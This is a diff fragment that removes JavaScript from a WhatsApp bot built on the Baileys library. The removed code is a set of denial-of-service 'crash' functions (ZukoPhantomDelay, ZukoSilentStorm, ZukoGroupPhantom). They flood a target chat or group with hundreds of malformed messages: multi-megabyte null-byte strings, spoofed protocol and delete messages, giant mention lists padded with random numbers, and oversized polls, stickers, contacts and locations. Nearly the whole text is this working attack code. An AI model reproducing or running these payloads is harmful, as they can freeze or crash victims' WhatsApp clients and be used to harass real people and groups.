-                fileSha256: payload.fileSha256,
-                fileLength: "9999999999999",
-                pageCount: 1316134911 + i,
-                mediaKey: payload.mediaKey,
-                fileName: `⛤_${i}`,
-                fileEncSha256: payload.fileEncSha256,
-                directPath: payload.directPath,
-                contactVcard: true,
-                jpegThumbnail: payload.jpegThumbnail
-              },
-              hasMediaAttachment: true,
-            },
-            body: { text: `⛤${ui}` },
-            footer: { text: `⛤${ui}` },
-            nativeFlowMessage: {},
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              forwardingScore: 999 + i,
-              isForwarded: true,
-              fromMe: false,
-              participant: "0@s.whatsapp.net",
-              remoteJid: "status@broadcast",
-              quotedMessage: {
-                documentMessage: {
-                  url: payload.url,
-                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                  fileSha256: payload.fileSha256,
-                  fileLength: "9999999999999",
-                  pageCount: 131613491 + i,
-                  mediaKey: payload.mediaKey,
-                  fileName: `⛤_${i}`,
-                  fileEncSha256: payload.fileEncSha256,
-                  directPath: payload.directPath,
-                  contactVcard: true,
-                  jpegThumbnail: payload.jpegThumbnail
-                }
-              }
-            }
-          }
-        }
-      }
-    };
-
-    await empire.relayMessage(from, msg, { participant: { jid: from } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 PHANTOM DELAY Phase 1: ${i}/500 on ${from}`));
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 50));
-  }
-
-  // ====== PHASE 2: Invisible Poll Flood (200 iterations) ======
-  for (let i = 0; i < 200; i++) {
-    const pollOptions = [];
-    for (let p = 0; p < 500; p++) {
-      pollOptions.push({
-        optionName: `\u0000`.repeat(5000) + `_${p}_${i}`
-      });
-    }
-
-    const pollMsg = {
-      ephemeralMessage: {
-        message: {
-          pollCreationMessage: {
-            name: '\u0000'.repeat(50000) + `_${i}`,
-            options: pollOptions,
-            selectableOptionsCount: 1,
-            pollType: 'QUIZ',
-            correctAnswer: pollOptions[Math.floor(Math.random() * pollOptions.length)],
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              forwardingScore: 999 + i,
-              isForwarded: true,
-              fromMe: false,
-              participant: "0@s.whatsapp.net",
-              remoteJid: "status@broadcast"
-            }
-          }
-        }
-      }
-    };
-
-    await empire.relayMessage(from, pollMsg, { participant: { jid: from } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 PHANTOM DELAY Phase 2: ${i}/200 on ${from}`));
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 80));
-  }
-
-  // ====== PHASE 3: Invisible Protocol Flood (300 iterations) ======
-  for (let i = 0; i < 300; i++) {
-    const protocolMsg = {
-      protocolMessage: {
-        key: {
-          remoteJid: from,
-          id: crypto.randomBytes(16).toString('hex'),
-          fromMe: true,
-          participant: '0@s.whatsapp.net'
-        },
-        type: 25,
-        ephemeralExpiration: 999999999 + i,
-        status: 0,
-        contextInfo: {
-          participant: '0@s.whatsapp.net',
-          remoteJid: from,
-          isForwarded: true,
-          forwardingScore: 999999 + i,
-          mentionedJid: jidsss,
-          mentions: jidsss
-        }
-      }
-    };
-
-    await empire.relayMessage(from, protocolMsg, { participant: { jid: from } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 PHANTOM DELAY Phase 3: ${i}/300 on ${from}`));
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 60));
-  }
-
-  // ====== PHASE 4: Invisible ViewOnce + Interactive (100 iterations) ======
-  for (let i = 0; i < 100; i++) {
-    const viewOnceMsg = {
-      viewOnceMessage: {
-        message: {
-          messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 2,
-            messageSecret: crypto.randomBytes(32)
-          },
-          interactiveResponseMessage: {
-            body: {
-              text: '\u0000'.repeat(50000) + `_${i}`,
-              format: 'DEFAULT'
-            },
-            nativeFlowResponseMessage: {
-              name: 'call_permission_request',
-              paramsJson: '\u0000'.repeat(9999999) + `_${i}`,
-              version: 9
-            },
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              remoteJid: 'status@broadcast',
-              participant: Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-            }
-          }
-        }
-      }
-    };
-
-    await empire.relayMessage(from, viewOnceMsg, { participant: { jid: from } }).catch(() => {});
-
-    if (i % 20 === 0) {
-      console.log(chalk.gray(`👻 PHANTOM DELAY Phase 4: ${i}/100 on ${from}`));
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 100));
-  }
-
-  // ====== FINAL SURGE: 200 iterations of pure invisible chaos ======
-  for (let i = 0; i < 200; i++) {
-    const surgePayload = {
-      ephemeralMessage: {
-        message: {
-          protocolMessage: {
-            key: {
-              remoteJid: from,
-              id: crypto.randomBytes(16).toString('hex'),
-              fromMe: true,
-              participant: '0@s.whatsapp.net'
-            },
-            type: 16,
-            ephemeralExpiration: 999999999 + i,
-            groupStatusUpdate: {
-              type: 0,
-              status: 0
-            },
-            contextInfo: {
-              participant: '0@s.whatsapp.net',
-              remoteJid: from,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              mentionedJid: jidsss,
-              mentions: jidsss
-            }
-          }
-        }
-      }
-    };
-
-    await empire.relayMessage(from, surgePayload, { participant: { jid: from } }).catch(() => {});
-
-    if (i % 50 === 0) {
-      console.log(chalk.gray(`👻 PHANTOM DELAY Final Surge: ${i}/200 on ${from}`));
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 30));
-  }
-
-  console.log(chalk.green(`✅ ZUKO PHANTOM DELAY COMPLETE on ${from}`));
-  console.log(chalk.gray(`👻 TARGET ${from} HAS BEEN PHANTOM DELAYED 👻`));
-}
-// ============================================================
-// ZUKO SILENT STORM - Invisible Group Eraser
-// 100% invisible to all group members
-// Uses: Reactions, Deletions, Sticker Packs, Location, Contacts
-// ============================================================
-// ============================================================
-// ZUKO SILENT STORM - Invisible Group Eraser (FIXED)
-// ============================================================
-async function ZukoSilentStorm(groupJid) {
-  const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
-  const crypto = require('crypto');
-  const path = require('path');
-  const fs = require('fs');
-
-  const tempDir = path.join(__dirname, '../database/temp');
-  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
-
-  const generateRandomJid = () => {
-    const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
-    return `"${randomNumber}@s.whatsapp.net"`;
-  };
-
-  let groupMembers = [];
-  try {
-    const metadata = await empire.groupMetadata(groupJid);
-    groupMembers = metadata.participants.map(p => p.id);
-  } catch (e) {}
-
-  const createTempFile = () => {
-    const tempFilePath = path.join(tempDir, `silent_storm_${Date.now()}.json`);
-    let jids = [];
-    let currentSize = 0;
-    for (const member of groupMembers) {
-      jids.push(`"${member}"`);
-      currentSize += member.length + 3;
-    }
-    while (currentSize < 4061432 - 50) {
-      const jid = generateRandomJid();
-      jids.push(jid);
-      currentSize += jid.length + 3;
-    }
-    fs.writeFileSync(tempFilePath, `[${jids.join(',')}]`);
-    return tempFilePath;
-  };
-
-  const tempFilePath = createTempFile();
-  const jidsss = JSON.parse(fs.readFileSync(tempFilePath));
-
-  setTimeout(() => {
-    try { fs.unlinkSync(tempFilePath); } catch (e) {}
-  }, 5000);
-
-  const ui = 'ꦽ'.repeat(5000);
-
-  // PHASE 1: Reaction Flood (400)
-  for (let i = 0; i < 400; i++) {
-    const reactionMsg = {
-      ephemeralMessage: {
-        message: {
-          reactionMessage: {
-            key: {
-              remoteJid: groupJid,
-              id: crypto.randomBytes(16).toString('hex'),
-              fromMe: true,
-              participant: '0@s.whatsapp.net'
-            },
-            text: '🌪️'.repeat(50000) + '\u0000'.repeat(50000),
-            groupingKey: crypto.randomBytes(32).toString('hex'),
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              participant: '0@s.whatsapp.net',
-              remoteJid: 'status@broadcast'
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, reactionMsg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Phase 1: ${i}/400`));
-    await new Promise(resolve => setTimeout(resolve, 30));
-  }
-
-  // PHASE 2: Deletion Flood (300)
-  for (let i = 0; i < 300; i++) {
-    const deleteKeys = Array.from({ length: 100 }, () => ({
-      remoteJid: groupJid,
-      id: crypto.randomBytes(16).toString('hex'),
-      fromMe: true,
-      participant: '0@s.whatsapp.net'
-    }));
-    const deleteMsg = {
-      ephemeralMessage: {
-        message: {
-          protocolMessage: {
-            key: {
-              remoteJid: groupJid,
-              id: crypto.randomBytes(16).toString('hex'),
-              fromMe: true,
-              participant: '0@s.whatsapp.net'
-            },
-            type: 13,
-            deleteMessages: { keys: deleteKeys },
-            contextInfo: {
-              participant: '0@s.whatsapp.net',
-              remoteJid: groupJid,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              mentionedJid: jidsss,
-              mentions: jidsss
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, deleteMsg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Phase 2: ${i}/300`));
-    await new Promise(resolve => setTimeout(resolve, 40));
-  }
-
-  // PHASE 3: Sticker Pack Flood (200)
-  for (let i = 0; i < 200; i++) {
-    const stickers = [];
-    for (let s = 0; s < 100; s++) {
-      stickers.push({
-        fileName: `${crypto.randomBytes(16).toString('hex')}.webp`,
-        isAnimated: true,
-        accessibilityLabel: '\u0000'.repeat(5000),
-        isLottie: false,
-        mimetype: 'image/webp'
-      });
-    }
-    const stickerMsg = {
-      ephemeralMessage: {
-        message: {
-          stickerPackMessage: {
-            stickerPackId: crypto.randomBytes(16).toString('hex'),
-            name: '\u0000'.repeat(50000) + `_${i}`,
-            publisher: '\u0000'.repeat(50000),
-            stickers: stickers,
-            fileLength: '9999999999999',
-            fileSha256: crypto.randomBytes(32).toString('base64'),
-            fileEncSha256: crypto.randomBytes(32).toString('base64'),
-            mediaKey: crypto.randomBytes(32).toString('base64'),
-            directPath: `/v/t62.15575-24/${Math.floor(Math.random() * 999999999)}_${Math.floor(Math.random() * 999999999)}_n.enc?ccb=11-4&oh=01&oe=685F4C37&_nc_sid=5e03e0`,
-            mediaKeyTimestamp: Date.now().toString(),
-            trayIconFileName: `${crypto.randomBytes(16).toString('hex')}.png`,
-            thumbnailDirectPath: crypto.randomBytes(16).toString('hex'),
-            thumbnailSha256: crypto.randomBytes(32).toString('base64'),
-            thumbnailEncSha256: crypto.randomBytes(32).toString('base64'),
-            thumbnailHeight: 99999999,
-            thumbnailWidth: 99999999,
-            imageDataHash: crypto.randomBytes(32).toString('base64'),
-            stickerPackSize: 99999999999,
-            stickerPackOrigin: 99999999999,
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              participant: '0@s.whatsapp.net',
-              remoteJid: 'status@broadcast'
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, stickerMsg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Phase 3: ${i}/200`));
-    await new Promise(resolve => setTimeout(resolve, 60));
-  }
-
-  // PHASE 4: Contact Flood (200)
-  for (let i = 0; i < 200; i++) {
-    const contactMsg = {
-      ephemeralMessage: {
-        message: {
-          contactMessage: {
-            displayName: '\u0000'.repeat(50000) + `_${i}`,
-            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:\u0000${i}\nTEL;waid=${Math.floor(Math.random() * 999999999)}:${Math.floor(Math.random() * 999999999)}\nEND:VCARD`,
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              participant: '0@s.whatsapp.net',
-              remoteJid: 'status@broadcast'
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, contactMsg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Phase 4: ${i}/200`));
-    await new Promise(resolve => setTimeout(resolve, 50));
-  }
-
-  // PHASE 5: Location Flood (200)
-  for (let i = 0; i < 200; i++) {
-    const locationMsg = {
-      ephemeralMessage: {
-        message: {
-          locationMessage: {
-            degreesLatitude: 999999999999999,
-            degreesLongitude: -999999999999999,
-            name: '\u0000'.repeat(50000) + `_${i}`,
-            address: '\u0000'.repeat(50000) + `_${i}`,
-            url: `https://${'\u0000'.repeat(50000)}.com`,
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              participant: '0@s.whatsapp.net',
-              remoteJid: 'status@broadcast'
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, locationMsg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Phase 5: ${i}/200`));
-    await new Promise(resolve => setTimeout(resolve, 55));
-  }
-
-  // PHASE 6: Payment Flood (150)
-  for (let i = 0; i < 150; i++) {
-    const paymentMsg = {
-      ephemeralMessage: {
-        message: {
-          requestPaymentMessage: {
-            currencyCodeIso4217: 'USD',
-            requestFrom: '0@s.whatsapp.net',
-            expiryTimestamp: Date.now() + 9999999999,
-            amount: {
-              value: 999999999999999,
-              offset: 999999999999999,
-              currencyCode: 'USD'
-            },
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              participant: '0@s.whatsapp.net',
-              remoteJid: 'status@broadcast',
-              externalAdReply: {
-                title: '\u0000'.repeat(50000),
-                body: '\u0000'.repeat(50000),
-                mediaType: 'IMAGE',
-                showAdAttribution: true
-              }
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, paymentMsg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Phase 6: ${i}/150`));
-    await new Promise(resolve => setTimeout(resolve, 70));
-  }
-
-  // FINAL SURGE (250)
-  for (let i = 0; i < 250; i++) {
-    const surgePayload = {
-      ephemeralMessage: {
-        message: {
-          protocolMessage: {
-            key: {
-              remoteJid: groupJid,
-              id: crypto.randomBytes(16).toString('hex'),
-              fromMe: true,
-              participant: '0@s.whatsapp.net'
-            },
-            type: 25,
-            ephemeralExpiration: 999999999 + i,
-            contextInfo: {
-              participant: '0@s.whatsapp.net',
-              remoteJid: groupJid,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              quotedMessage: {
-                reactionMessage: {
-                  text: '🌪️'.repeat(50000) + '\u0000'.repeat(50000),
-                  groupingKey: crypto.randomBytes(32).toString('hex')
-                }
-              }
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(groupJid, surgePayload, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`🌪️ STORM Final Surge: ${i}/250`));
-    await new Promise(resolve => setTimeout(resolve, 25));
-  }
-
-  console.log(chalk.green(`✅ ZUKO SILENT STORM COMPLETE on ${groupJid}`));
-}
-
-// ============================================================
-// ZUKO PHANTOM DELAY - Invisible Strong Delay (FIXED)
-// ============================================================
-async function ZukoPhantomDelay(target) {
-  const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
-  const crypto = require('crypto');
-  const path = require('path');
-  const fs = require('fs');
-
-  const tempDir = path.join(__dirname, '../database/temp');
-  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
-
-  const generateRandomJid = () => {
-    const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
-    return `"${randomNumber}@s.whatsapp.net"`;
-  };
-
-  const createTempFile = () => {
-    const tempFilePath = path.join(tempDir, `phantom_jids_${Date.now()}.json`);
-    let jids = [];
-    let currentSize = 0;
-    while (currentSize < 2061432 - 50) {
-      const jid = generateRandomJid();
-      jids.push(jid);
-      currentSize += jid.length + 3;
-    }
-    fs.writeFileSync(tempFilePath, `[${jids.join(',')}]`);
-    return tempFilePath;
-  };
-
-  const tempFilePath = createTempFile();
-  const jidsss = JSON.parse(fs.readFileSync(tempFilePath));
-
-  setTimeout(() => {
-    try { fs.unlinkSync(tempFilePath); } catch (e) {}
-  }, 5000);
-
-  const documentPayloads = [
-    {
-      url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
-      fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
-      mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
-      fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
-      directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
-      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k="
-    },
-    {
-      url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
-      fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
-      mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
-      fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
-      directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
-      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAEDBQIGAQEBAQEAAAAAAAAAAAAAAAACAQAD/9oADAMBAAIQAxAAAACqa++PXQ0Ik6Y47WM93tTIKSih1F8ddXgrkvU0c1522lfS0k081erMWxNd+mlFfanKTfJqJnlipE66zSVhyul530vQtK3Jy4JwM2gBugaZr4M+lxwKwgEf/8QAKBAAAgIBAwMEAQUAAAAAAAAAAAIAAxEEEjEQIQUFEyJRYRMkMnGB/9oACAEBAAE/AIDNLTn5t0GMTvMq2ZfSVOV4n+9K13uoiqFUCEzBEU5JH4iVsr95am5THYrZtgmjXNwmeYTwYSAMme8qV9ncGJcriZBlmkqsOcYMBmiYC0zPciC+reEJmBPY5sZj95hQIRgS+4j4rzK7SUzzMymzY4MFz2ElPAldAv2vwymcATd3wI3bbmWDNr/1F1IpTuMnwJmZmg7I7QOabM+DBdU/mbgBkQPvU/gxkGS33NQxFpOMBeJkDppvjS8tANKt9CHU15xNKXJ4JBEVAuRNXaKqD9mM7N/I56DkRG26Vm+zGt/ZqTA21twmkvF9XbAIjMwxunqNamgP14lpxpa1E1OU09SHp6c+LwPBhQHE9T1S4/RHT//EAB0RAQEAAgIDAwAAAAAAAAAAAAEAEEERMRIhUdH/2gAIAQIBAT8AmNT9yHMFz7S5Jh1h7vEcfslvOyY7x//EABoRAAICAwAAAAAAAAAAAAAAAAEQABEgMVH/2gAIAQMBAT8AzCpadsQvsEK//9k="
-    }
-  ];
-
-  const ui = 'ꦽ'.repeat(5000);
-
-  // PHASE 1: Document Flood (500)
-  for (let i = 0; i < 500; i++) {
-    const payload = documentPayloads[i % documentPayloads.length];
-    const msg = {
-      ephemeralMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              documentMessage: {
-                url: payload.url,
-                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                fileSha256: payload.fileSha256,
-                fileLength: "9999999999999",
-                pageCount: 1316134911 + i,
-                mediaKey: payload.mediaKey,
-                fileName: `⛤_${i}`,
-                fileEncSha256: payload.fileEncSha256,
-                directPath: payload.directPath,
-                contactVcard: true,
-                jpegThumbnail: payload.jpegThumbnail
-              },
-              hasMediaAttachment: true,
-            },
-            body: { text: `⛤${ui}` },
-            footer: { text: `⛤${ui}` },
-            nativeFlowMessage: {},
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              forwardingScore: 999 + i,
-              isForwarded: true,
-              fromMe: false,
-              participant: "0@s.whatsapp.net",
-              remoteJid: "status@broadcast",
-              quotedMessage: {
-                documentMessage: {
-                  url: payload.url,
-                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                  fileSha256: payload.fileSha256,
-                  fileLength: "9999999999999",
-                  pageCount: 131613491 + i,
-                  mediaKey: payload.mediaKey,
-                  fileName: `⛤_${i}`,
-                  fileEncSha256: payload.fileEncSha256,
-                  directPath: payload.directPath,
-                  contactVcard: true,
-                  jpegThumbnail: payload.jpegThumbnail
-                }
-              }
-            }
-          }
-        }
-      }
-    };
-
-    await empire.sendMessage(target, msg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`👻 PHANTOM Phase 1: ${i}/500`));
-    await new Promise(resolve => setTimeout(resolve, 50));
-  }
-
-  // PHASE 2: Poll Flood (200)
-  for (let i = 0; i < 200; i++) {
-    const pollOptions = [];
-    for (let p = 0; p < 500; p++) {
-      pollOptions.push({ optionName: `\u0000`.repeat(5000) + `_${p}_${i}` });
-    }
-    const pollMsg = {
-      ephemeralMessage: {
-        message: {
-          pollCreationMessage: {
-            name: '\u0000'.repeat(50000) + `_${i}`,
-            options: pollOptions,
-            selectableOptionsCount: 1,
-            pollType: 'QUIZ',
-            correctAnswer: pollOptions[Math.floor(Math.random() * pollOptions.length)],
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              forwardingScore: 999 + i,
-              isForwarded: true,
-              fromMe: false,
-              participant: "0@s.whatsapp.net",
-              remoteJid: "status@broadcast"
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(target, pollMsg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`👻 PHANTOM Phase 2: ${i}/200`));
-    await new Promise(resolve => setTimeout(resolve, 80));
-  }
-
-  // PHASE 3: Protocol Flood (300)
-  for (let i = 0; i < 300; i++) {
-    const protocolMsg = {
-      protocolMessage: {
-        key: {
-          remoteJid: target,
-          id: crypto.randomBytes(16).toString('hex'),
-          fromMe: true,
-          participant: '0@s.whatsapp.net'
-        },
-        type: 25,
-        ephemeralExpiration: 999999999 + i,
-        status: 0,
-        contextInfo: {
-          participant: '0@s.whatsapp.net',
-          remoteJid: target,
-          isForwarded: true,
-          forwardingScore: 999999 + i,
-          mentionedJid: jidsss,
-          mentions: jidsss
-        }
-      }
-    };
-    await empire.sendMessage(target, protocolMsg, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`👻 PHANTOM Phase 3: ${i}/300`));
-    await new Promise(resolve => setTimeout(resolve, 60));
-  }
-
-  // PHASE 4: ViewOnce + Interactive (100)
-  for (let i = 0; i < 100; i++) {
-    const viewOnceMsg = {
-      viewOnceMessage: {
-        message: {
-          messageContextInfo: {
-            deviceListMetadata: {},
-            deviceListMetadataVersion: 2,
-            messageSecret: crypto.randomBytes(32)
-          },
-          interactiveResponseMessage: {
-            body: {
-              text: '\u0000'.repeat(50000) + `_${i}`,
-              format: 'DEFAULT'
-            },
-            nativeFlowResponseMessage: {
-              name: 'call_permission_request',
-              paramsJson: '\u0000'.repeat(9999999) + `_${i}`,
-              version: 9
-            },
-            contextInfo: {
-              mentionedJid: jidsss,
-              mentions: jidsss,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              remoteJid: 'status@broadcast',
-              participant: Math.floor(Math.random() * 99999999) + '@s.whatsapp.net'
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(target, viewOnceMsg).catch(() => {});
-    if (i % 20 === 0) console.log(chalk.gray(`👻 PHANTOM Phase 4: ${i}/100`));
-    await new Promise(resolve => setTimeout(resolve, 100));
-  }
-
-  // FINAL SURGE (200)
-  for (let i = 0; i < 200; i++) {
-    const surgePayload = {
-      ephemeralMessage: {
-        message: {
-          protocolMessage: {
-            key: {
-              remoteJid: target,
-              id: crypto.randomBytes(16).toString('hex'),
-              fromMe: true,
-              participant: '0@s.whatsapp.net'
-            },
-            type: 16,
-            ephemeralExpiration: 999999999 + i,
-            groupStatusUpdate: { type: 0, status: 0 },
-            contextInfo: {
-              participant: '0@s.whatsapp.net',
-              remoteJid: target,
-              isForwarded: true,
-              forwardingScore: 999999 + i,
-              mentionedJid: jidsss,
-              mentions: jidsss
-            }
-          }
-        }
-      }
-    };
-    await empire.sendMessage(target, surgePayload, { ephemeralExpiration: 0 }).catch(() => {});
-    if (i % 50 === 0) console.log(chalk.gray(`👻 PHANTOM Final Surge: ${i}/200`));
-    await new Promise(resolve => setTimeout(resolve, 30));
-  }
-
-  console.log(chalk.green(`✅ ZUKO PHANTOM DELAY COMPLETE on ${target}`));
-}
-// ZUKO GROUP PHANTOM - Invisible Group Delay (FIXED)
-// ============================================================
-async function ZukoGroupPhantom(groupJid) {
-  const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
-  const crypto = require('crypto');
-  const path = require('path');
-  const fs = require('fs');
-
-  const tempDir = path.join(__dirname, '../database/temp');
-  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
-
-  const generateRandomJid = () => {
-    const randomNumber = Math.floor(Math.random() * 1e10).toString().padStart(10, '0');
-    return `"${randomNumber}@s.whatsapp.net"`;
-  };
-
-  let groupMembers = [];
-  try {
-    const metadata = await empire.groupMetadata(groupJid);
-    groupMembers = metadata.participants.map(p => p.id);
-  } catch (e) {}
-
-  const createTempFile = () => {
-    const tempFilePath = path.join(tempDir, `group_phantom_${Date.now()}.json`);
-    let jids = [];
-    let currentSize = 0;
-    for (const member of groupMembers) {
-      jids.push(`"${member}"`);
-      currentSize += member.length + 3;
-    }
-    while (currentSize < 3061432 - 50) {
-      const jid = generateRandomJid();
-      jids.push(jid);
-      currentSize += jid.length + 3;
-    }
-    fs.writeFileSync(tempFilePath, `[${jids.join(',')}]`);
-    return tempFilePath;
-  };
-
-  const tempFilePath = createTempFile();
-  const jidsss = JSON.parse(fs.readFileSync(tempFilePath));
-
-  setTimeout(() => {
-    try { fs.unlinkSync(tempFilePath); } catch (e) {}
-  }, 5000);
-
-  const ui = 'ꦽ'.repeat(5000);
-
-  const documentPayloads = [
-    {
-      url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0&mms3=true",
-      fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
